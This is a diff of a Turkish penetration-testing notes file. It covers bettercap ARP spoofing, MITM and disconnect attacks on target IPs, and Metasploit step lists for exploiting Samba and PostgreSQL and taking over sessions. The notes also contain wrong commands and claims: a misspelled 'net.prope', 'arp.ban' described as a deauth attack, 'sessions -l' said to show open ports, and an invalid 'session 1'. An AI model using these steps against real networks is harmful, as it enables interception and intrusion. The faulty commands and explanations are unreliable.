@@ -236,19 +236,20 @@ Wireshark kullanarak ağ izleme yapılabilir ve ARP isteği var mı incelenebili
 
 * Terminal'e ```bettercap -iface eth0``` yazarak bettercap'i açıyoruz
 * bettercap çalıştırdıktan sonra ```help``` yazarsak içinde nelerin çalıştığını görebiliriz
-```
+
 * ```net.prope on``` Ağdaki cihazların IP adresini, MAC adreslerini ve cihaz isimlerini gösterir
 * ```net.show``` Toplanan bilgileri özet olarak gösterir
-```
-```
+
+
 Bettercap İçinde
+
 * ```arp.ban on``` hedef PC'ye deauth saldırısı yapar
 * ```arp.spoof.fullduplex``` Hem modeme hem PC'ye MITM saldırısı yapar
 * ```arp.spoof.internal``` True olursa, PC'ler arasındaki bağlantıları gösterir
 * ```arp.spoof.skip_restore``` True olursa, Saldırı sonrası doğru verileri göndermez
 * ```arp.spoof.targets 192.168.123.123``` "," koyarak birden fazla PC'ye MITM saldırısı yapabiliriz
 * ```arp.spoof.whitelist``` Belirtilen IP adreslerine sahip cihazlara saldırı yapmaz
-```
+
 Parametreleri değiştirmek için: ```set``` komutunu kullanıyoruz. ```(e.g. arp.spoof.fullduplex true)``` 
 
 > ### Bettercap ile Dinleme Yapma
@@ -324,7 +325,7 @@ Telnet SSH'dan daha güvensizdir. ```telnet 192.168.123.123``` çalıştırarak 
 ### SAMBA
 
 Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketlerdeki PC, yazıcı vb şeyleri birbirine bağlar
-```
+
 1. Samba Numarasını ```(samba smbd 3.x-4.x) exploit``` ile google'da ararız
 2. ```msfconsole``` açarız
 3. Google üzerinde çıkan komutları yazıyoruz
@@ -332,10 +333,10 @@ Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketler
 5. ```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
 6. ```sessions -l``` açık olan portları görürüz
 7. ```session 1``` 1. session açık olduğu için o porttan giriş yapar
-```
+
 
 ### POSTGRESQL METERPRETER
-```
+
 1.Postgresql kodunu google'da exploit olarak aratıyoruz
 2.```msfconsole``` açıyoruz
 3.Google üzerinden çıkan kodları çalıştırıyoruz
@@ -344,4 +345,4 @@ Samba linux sunucuları ile windows sunucularını birbirine bağlar. Şirketler
 6.```exploit -j -z``` dinleyeme başlıyoruz ```-j -z``` dersek dinlemeyi arka planda yapar
 7.```sessions -l``` açık olan portları görürüz
 8 ```session 1``` 1. session açık olduğu için o porttan giriş yapar
-```
+
